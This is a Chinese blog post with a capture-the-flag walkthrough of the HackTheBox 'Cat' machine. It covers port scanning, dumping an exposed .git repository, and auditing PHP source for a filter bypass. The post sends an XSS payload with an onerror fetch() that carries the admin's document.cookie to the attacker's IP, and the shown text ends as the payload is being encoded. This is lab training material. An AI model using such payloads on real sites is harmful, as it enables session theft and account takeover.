

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/xzq1_64x64.png">
  <link rel="icon" href="/img/xzq1_64x64.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="lingx5">
  <meta name="keywords" content="">
  
    <meta name="description" content="HTB-cat 靶机靶机地址: https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Cat 一台中等难度的靶机，主要是练习利用来 xss 钓鱼，进行攻克的靶机。 nmap 扫描1sudo nmap -sT --min-rate 10000 -p- 10.10.11.53 -o ports  1234567891011[sudo] password for kali: Sta">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB-cat 靶机">
<meta property="og:url" content="http://lingx5.github.io/2025/07/19/HTB-cat-%E9%9D%B6%E6%9C%BA/index.html">
<meta property="og:site_name" content="lingx5的博客">
<meta property="og:description" content="HTB-cat 靶机靶机地址: https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Cat 一台中等难度的靶机，主要是练习利用来 xss 钓鱼，进行攻克的靶机。 nmap 扫描1sudo nmap -sT --min-rate 10000 -p- 10.10.11.53 -o ports  1234567891011[sudo] password for kali: Sta">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719112919481.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719121133539.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719123323436.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719123437967.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719123715495.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719123911915.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719125340109.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719125940430.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719132110494.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719134032229.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719134247568.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719134441117.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719145621732.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719145824393.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719153748349.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719154238622.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719154422649.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719161243864.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719161420168.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719163946141.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719164056131.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719165120686.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719165219211.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719170038100.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719195524391.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719202547271.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719203425682.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719205112226.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719205235659.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719210423054.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719210516961.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719211632410.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719211922034.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719212010887.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719212147375.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719212744076.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719214437092.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719215028391.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719220343898.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719220734916.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719220831149.png">
<meta property="article:published_time" content="2025-07-19T14:13:02.000Z">
<meta property="article:modified_time" content="2025-07-19T14:13:45.530Z">
<meta property="article:author" content="lingx5">
<meta property="article:tag" content="HTB靶机">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250719112919481.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>HTB-cat 靶机 - lingx5的博客</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"lingx5.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Q4th1PtYC02FHNKGV3QVJgNX-MdYXbMMI","app_key":"Y9vGCfdqm9u55ZBjM8ep8KDX","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-3-23","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>lingx5的博客</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="HTB-cat 靶机"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-07-19 22:13" pubdate>
          2025年7月19日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          3.5k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          29 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">HTB-cat 靶机</h1>
            
            
              <div class="markdown-body">
                
                <meta name="referrer" content="no-referrer" />

<h1 id="HTB-cat-靶机"><a href="#HTB-cat-靶机" class="headerlink" title="HTB-cat 靶机"></a>HTB-cat 靶机</h1><p>靶机地址: <a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/Cat">https://app.hackthebox.com/machines/Cat</a></p>
<p>一台中等难度的靶机，主要是练习利用来 xss 钓鱼，进行攻克的靶机。</p>
<h2 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 10.10.11.53 -o ports<br></code></pre></td></tr></table></figure>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap <span class="hljs-number">7.95</span> ( https://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2025</span>-<span class="hljs-number">07</span>-<span class="hljs-number">18</span> <span class="hljs-number">23</span>:<span class="hljs-number">19</span> EDT<br>Warning: <span class="hljs-number">10.10</span>.<span class="hljs-number">11.53</span> giving <span class="hljs-keyword">up</span> <span class="hljs-keyword">on</span> port because retransmission cap hit (<span class="hljs-number">10</span>).<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-keyword">cat</span>.htb (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.53</span>)<br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.23</span>s latency).<br>Not shown: <span class="hljs-number">62804</span> closed tcp ports (conn-refused), <span class="hljs-number">2729</span> filtered tcp ports (<span class="hljs-keyword">no</span>-response)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp <span class="hljs-keyword">open</span>  ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">41.18</span> seconds<br></code></pre></td></tr></table></figure>

<p>看到只开放了 22，80 两个端口</p>
<p>继续进行详细信息扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nmap -sT -A -p22,80 10.10.11.53 -o details<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719112919481.png" srcset="/img/loading.gif" lazyload alt="image-20250719112919481"></p>
<p>看到有 redirect ，我们需要把这个域名与 ip 绑定才能保证详细信息的准确性。在 hosts 文件中绑定看一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;\n10.10.11.53  cat.htb&#x27;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a /etc/hosts<br></code></pre></td></tr></table></figure>

<p>配置好重新进行扫描</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-number">7.95</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2025-07-18 23:43 EDT</span><br>Nmap scan report for cat.htb (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.53</span>)<br>Host is up (<span class="hljs-number">0.23s</span> latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">11</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-attribute">ssh-hostkey</span>: <br>|   <span class="hljs-number">3072</span> <span class="hljs-number">96</span>:<span class="hljs-number">2</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">f5</span>:<span class="hljs-attribute">c6</span>:<span class="hljs-attribute">f6</span>:<span class="hljs-number">9</span><span class="hljs-attribute">f</span>:<span class="hljs-number">59</span>:<span class="hljs-number">60</span>:<span class="hljs-attribute">e5</span>:<span class="hljs-number">65</span>:<span class="hljs-number">85</span>:<span class="hljs-attribute">ab</span>:<span class="hljs-number">49</span>:<span class="hljs-attribute">e4</span>:<span class="hljs-number">76</span>:<span class="hljs-number">14</span> (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">9</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">c4</span>:<span class="hljs-attribute">a4</span>:<span class="hljs-number">40</span>:<span class="hljs-attribute">e9</span>:<span class="hljs-attribute">da</span>:<span class="hljs-attribute">cc</span>:<span class="hljs-number">62</span>:<span class="hljs-attribute">d1</span>:<span class="hljs-attribute">d6</span>:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span><span class="hljs-attribute">f</span>:<span class="hljs-number">9</span><span class="hljs-attribute">e</span>:<span class="hljs-number">7</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">d4</span>:aa (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">22</span>:<span class="hljs-number">2</span><span class="hljs-attribute">a</span>:<span class="hljs-number">6</span><span class="hljs-attribute">a</span>:<span class="hljs-number">6</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">eb</span>:<span class="hljs-attribute">de</span>:<span class="hljs-number">19</span>:<span class="hljs-attribute">b7</span>:<span class="hljs-number">16</span>:<span class="hljs-number">97</span>:<span class="hljs-attribute">c2</span>:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">89</span>:<span class="hljs-number">29</span>:d5 (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> ((Ubuntu))<br>| <span class="hljs-attribute">http-git</span>: <br>|   <span class="hljs-number">10.10</span>.<span class="hljs-number">11.53</span>:<span class="hljs-number">80</span>/.git/<br>|     Git repository found!<br>|     Repository <span class="hljs-attribute">description</span>: Unnamed repository; edit this file <span class="hljs-string">&#x27;description&#x27;</span> to name the...<br>|_    Last commit <span class="hljs-attribute">message</span>: Cat v1 <br>|<span class="hljs-attribute">_http-title</span>: Best Cat Competition<br>| <span class="hljs-attribute">http-cookie-flags</span>: <br>|   /: <br>|     <span class="hljs-attribute">PHPSESSID</span>: <br>|_      httponly flag <span class="hljs-keyword">not</span> set<br>|<span class="hljs-attribute">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)<br><span class="hljs-attribute">Warning</span>: OSScan results may be unreliable because we could <span class="hljs-keyword">not</span> find at least <span class="hljs-number">1</span> open <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> closed port<br>Device <span class="hljs-attribute">type</span>: general purpose|router<br><span class="hljs-attribute">Running</span>: Linux <span class="hljs-number">4</span>.X|<span class="hljs-number">5</span>.X, MikroTik RouterOS <span class="hljs-number">7</span>.X<br>OS <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:<span class="hljs-attribute">linux_kernel</span>:<span class="hljs-number">4</span> <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:<span class="hljs-attribute">linux_kernel</span>:<span class="hljs-number">5</span> <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">mikrotik</span>:<span class="hljs-attribute">routeros</span>:<span class="hljs-number">7</span> <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:<span class="hljs-attribute">linux_kernel</span>:<span class="hljs-number">5.6</span>.<span class="hljs-number">3</span><br>OS <span class="hljs-attribute">details</span>: Linux <span class="hljs-number">4.15</span> - <span class="hljs-number">5.19</span>, MikroTik RouterOS <span class="hljs-number">7.2</span> - <span class="hljs-number">7.5</span> (Linux <span class="hljs-number">5.6</span>.<span class="hljs-number">3</span>)<br>Network <span class="hljs-attribute">Distance</span>: <span class="hljs-number">2</span> hops<br>Service <span class="hljs-attribute">Info</span>: <span class="hljs-attribute">OS</span>: Linux; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:linux_kernel<br><br>TRACEROUTE (using proto <span class="hljs-number">1</span>/icmp)<br>HOP RTT       ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">235.06</span> ms <span class="hljs-number">10.10</span>.<span class="hljs-number">14.1</span><br><span class="hljs-number">2</span>   <span class="hljs-number">239.15</span> ms cat.htb (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.53</span>)<br><br>OS <span class="hljs-keyword">and</span> Service detection performed. Please report any incorrect results at <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">23.33</span> seconds<br></code></pre></td></tr></table></figure>

<p>我们通过这次看到了关键信息 <code>10.10.11.53:80/.git/</code> 与 <code>httponly flag not set</code> </p>
<p>我们可以利用 <code>git-dumper</code> 工具把目标的源码给拉下来。同时 httponly 没有设置，这就让我们利用 xss 偷到目标 cookie 会比较简单</p>
<h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><p>先拉源码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git-dumper http://cat.htb/.git/ dump<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719121133539.png" srcset="/img/loading.gif" lazyload alt="image-20250719121133539"></p>
<p>我们打开 80 端口，熟悉一下网站的功能</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250719123323436.png" srcset="/img/loading.gif" lazyload alt="image-20250719123323436" style="zoom:67%;" />

<p>看到 home vote contest winners join 页面</p>
<p>我们都点一下，发现 join 页面可以注册</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250719123437967.png" srcset="/img/loading.gif" lazyload alt="image-20250719123437967" style="zoom: 50%;" />

<p>注册一个账户，登录。我们发现 contest 可以访问了，功能是添加一个猫咪去竞赛</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250719123715495.png" srcset="/img/loading.gif" lazyload alt="image-20250719123715495" style="zoom:50%;" />

<p>我们正常添加一个，成功添加，提示信息表示：<code>这个小猫会被发送去检测</code> 那应该就是管理员要检测我们上传的猫咪</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250719123911915.png" srcset="/img/loading.gif" lazyload alt="image-20250719123911915" style="zoom:50%;" />

<p>看一下源码，用 vscode 打开，看到给参数屏蔽了一些特殊字符</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719125340109.png" srcset="/img/loading.gif" lazyload alt="image-20250719125340109"></p>
<p>顺便看一下管理员查看审核猫咪的页面 <code>view_cat.php</code></p>
<p>在 title 处使用了 <code>htmlspecialchars()</code> 函数，就不存在 xss，我们继续往下看</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719125940430.png" srcset="/img/loading.gif" lazyload alt="image-20250719125940430"></p>
<p>来到猫咪显示的 <code>container</code> , 看到 <code>&lt;img&gt;</code> 标签的 src 属性直接就接上了 php 的 echo 函数，没做任何的过滤</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719132110494.png" srcset="/img/loading.gif" lazyload alt="image-20250719132110494"></p>
<p>这里就可以利用 onerror 函数来进行 xss</p>
<blockquote>
<p>为什么不是任何的 echo 都可以 xss ？</p>
<p>因为前面 content.php 中，在上传是对参数做了 <code>forbidden_patterns</code> ，过滤了特殊字符 <code>/[+*&#123;&#125;&#39;,;&lt;&gt;()\\[\\]\\/\\:]/</code> </p>
<p>也就是这些字符</p>
<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">+  *  &#123;  &#125;  &#x27;  ,  ;  <span class="hljs-attribute">&lt;  &gt;</span>  (  )  [  ]  \  /  :<br></code></pre></td></tr></table></figure>

<p>所以我们要通过 html 实体编码来进行绕过，而实体编码在浏览器是原因输出 <strong>(包括 <code>&quot;&quot;</code> 实体编码后也就相当于加了注释符，会被当作普通字符串处理)</strong> 不会被浏览器解析为标签，这就是我们我们只能利用 <code>&lt;img src=.....&gt;</code> 这样标签的原因</p>
</blockquote>
<p>嵌入的字符串为 <code>$cat[&#39;photo_path&#39;]</code> 我们来跟一下 <code>$cat[&#39;photo_path&#39;]</code> 是怎么生成的，因为在 POST 传参时，并没有这个变量</p>
<p>在 <code>view_cat.php</code> 中 <code>$cat</code> 是通过数据库查到的</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719134032229.png" srcset="/img/loading.gif" lazyload alt="image-20250719134032229"></p>
<p>来到 <code>contest.php</code> 看到数据库插入中的 <code>photo_path</code> 参数的生成</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250719134247568.png" srcset="/img/loading.gif" lazyload alt="image-20250719134247568" style="zoom: 50%;" />

<p>绑定的是 <code>$rget_file</code> 变量，继续跟</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719134441117.png" srcset="/img/loading.gif" lazyload alt="image-20250719134441117"></p>
<blockquote>
<p><code>basename</code> 就是安全提取文件明的，是为了防止目录穿越的攻击</p>
</blockquote>
<p>由此我们可以推测 <code>$cat[&#39;photo_path&#39;]</code> 实行如 <code>uploads/随机值_ + name参数</code> </p>
<p>举个例子：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">uploads/dsagdfsng4wegf_小猫.jpg<br></code></pre></td></tr></table></figure>

<p>xss 注入的结果，把 name 换为 <code>x &quot; onerror=&quot;fetch(&#39;http://10.10.14.25:8000?cookie=&#39;+document.cookie); </code></p>
<p>这样 <code>$cat[&#39;photo_path&#39;]</code> 就是</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">uploads/dsagdfsng4wegf_x <span class="hljs-string">&quot; onerror=&quot;</span>fetch(&#x27;http<span class="hljs-symbol">://10</span>.<span class="hljs-number">10.14</span>.<span class="hljs-number">25</span>:<span class="hljs-number">8000</span>?cookie=&#x27;+document.cookie)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>拼接到管理员查看猫咪的 <code>view_cat.php</code> 就是</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;uploads/dsagdfsng4wegf_x &quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;fetch(&#x27;http://10.10.14.25:8000?cookie=&#x27;+document.cookie);&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;x &quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;fetch(&#x27;http://10.10.14.25:8000?cookie=&#x27;+document.cookie);&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cat-photo&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure>

<p>在 <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">cyberchef</a> 中 进行 html 实体编码，把 <code>;</code> 要置换为空，因为 <code>;</code> 也在 forbidden 中</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719145621732.png" srcset="/img/loading.gif" lazyload alt="image-20250719145621732"></p>
<p>拿到 payload</p>
